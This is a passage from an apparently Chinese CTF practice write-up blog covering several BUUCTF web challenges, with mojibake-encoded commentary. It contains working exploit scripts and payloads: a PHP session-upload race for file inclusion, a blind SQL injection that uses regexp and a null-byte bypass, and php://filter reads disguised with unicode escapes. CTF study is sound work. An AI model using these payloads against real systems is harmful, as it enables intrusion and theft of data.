</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)},</span>
</span></span><span class="line"><span class="cl">            <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="n">sessid</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">READ</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s1">?file=/tmp/sess_</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;flag{&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">Waiting...&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;flag{(.*?)}&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">READ</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nctf2019sqli">[NCTF2019]SQLi
</h2><p>æœ‰ä¸ªrobots.txt</p>
<p>è¿™é‡Œwafäº†ä¸€å †å…³é”®å­—,ç”¨æˆ·åæ˜¯admin</p>
<p>ä¸»è¦ç”¨regexpæ­£åˆ™æ¥ç»•è¿‡</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from users where username=&#39;\&#39; and passwd=&#39;||/**/passwd/**/regexp/**/\&#34;^a\&#34;;%00&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="p">:</span> <span class="n">username</span><span class="o">=</span>\<span class="o">&amp;</span><span class="n">passwd</span><span class="o">=||</span><span class="n">passwd</span><span class="o">/**/</span><span class="n">regexp</span><span class="o">/**/</span><span class="s2">&#34;^a&#34;</span><span class="p">;</span><span class="o">%</span><span class="mi">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>é€šè¿‡<code>\</code> è½¬ä¹‰usernameåç¬¬äºŒä¸ªå•å¼•å·è¿›è€Œé—­åˆæ‰passwdåç¬¬ä¸€ä¸ªå¼•å·</li>
<li>é€šè¿‡%00æˆªæ–­ ä»£æ›¿# â€“</li>
<li>regexp â€œ^aâ€ è¡¨ç¤º æŸ¥æ‰¾passwdåˆ—ä¸­ä»¥aä¸ºèµ·å§‹çš„</li>
</ol>
<p>å¦‚æœæ³¨å…¥æˆåŠŸä¼šå›æ˜¾welcome.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://eec98765-3741-49a5-8773-6d1b31843e2e.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;UM_distinctid&#39;</span><span class="p">:</span> <span class="s1">&#39;17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Origin&#39;</span><span class="p">:</span> <span class="s1">&#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">table</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;_</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;passwd&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;||(passwd/**/regexp/**/&#34;^</span><span class="si">{</span><span class="n">flag</span> <span class="o">+</span> <span class="n">i</span><span class="si">}</span><span class="s1">&#34;);&#39;</span> <span class="o">+</span> <span class="n">unquote</span><span class="p">(</span><span class="s1">&#39;%00&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;404 Not Found&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">lower</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886.png"
	width="1837"
	height="615"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886_hu1233877924209684791.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324205158886_hu382011051222534790.png 1024w"
	loading="lazy"
	
		alt="image-20250324205158886"
	
	
		class="gallery-image" 
		data-flex-grow="298"
		data-flex-basis="716px"
	
></p>
<h2 id="ç½‘é¼æ¯-2020-åŠå†³èµ›alicewebsite">[ç½‘é¼æ¯ 2020 åŠå†³èµ›]AliceWebsite
</h2><p>index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$action</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;home.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">include</span> <span class="nv">$action</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;File not found!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰æ–‡ä»¶åŒ…å«ï¼Œç„¶åç”¨ç›®å½•ç©¿è¶Šè¯»åˆ°flag</p>
<h2 id="harekazectf2019encode_and_encode">[HarekazeCTF2019]encode_and_encode
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$banword</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no path traversal
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;\.\.&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no stream wrapper
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// no data exfiltration
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;flag&#39;</span>
</span></span><span class="line"><span class="cl">  <span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$banword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$body</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$body</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$body</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$page</span> <span class="o">=</span> <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$content</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;&lt;p&gt;not found&lt;/p&gt;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// no data exfiltration!!!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$content</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/HarekazeCTF\{.+\}/i&#39;</span><span class="p">,</span> <span class="s1">&#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span><span class="s1">&#39;content&#39;</span> <span class="o">=&gt;</span> <span class="nv">$content</span><span class="p">]);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>unicodeç¼–ç ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œå› ä¸ºjson_decodeæ—¶ä¼šæŠŠunicodeç¼–ç è½¬ç </p>
<p>jsonæ ¼å¼çš„pageä¼ ä¼ªåè®®è¯»flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;page&#34;:&#34;php://filter/convert.base64-encode/resource=/flag&#34;}
</span></span><span class="line"><span class="cl">{&#34;page&#34;:&#34;\u0070\u0068\u0070\u003A\u002F\u002F\u0066\u0069\u006C\u0074\u0065\u0072\u002F\u0063\u006F\u006E\u0076\u0065\u0072\u0074\u002E\u0062\u0061\u0073\u0065\u0036\u0034\u002D\u0065\u006E\u0063\u006F\u0064\u0065\u002F\u0072\u0065\u0073\u006F\u0075\u0072\u0063\u0065\u003D\u002F\u0066\u006C\u0061\u0067&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2019easyweb">[SUCTF 2019]EasyWeb
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get_the_flag</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// webadmin will remove your upload file every 20 min!!!! 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">&#34;upload/tmp_&#34;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="s2">&#34;.&#34;</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ph/i&#34;</span><span class="p">,</span><span class="nv">$extension</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">mb_strpos</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">),</span> <span class="s1">&#39;&lt;?&#39;</span><span class="p">)</span><span class="o">!==</span><span class="k">False</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;^_^&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$path</span><span class="o">=</span> <span class="nv">$userdir</span><span class="o">.</span><span class="s2">&#34;/&#34;</span><span class="o">.</span><span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$hhh</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;_&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$hhh</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">18</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;One inch long, one inch strong!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[\x00- 0-9A-Za-z\&#39;&#34;\`~_&amp;.,|=[\x7F]+/i&#39;</span><span class="p">,</span> <span class="nv">$hhh</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Try something else!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$character_type</span> <span class="o">=</span> <span class="nx">count_chars</span><span class="p">(</span><span class="nv">$hhh</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$character_type</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">12</span><span class="p">)</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Almost there!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
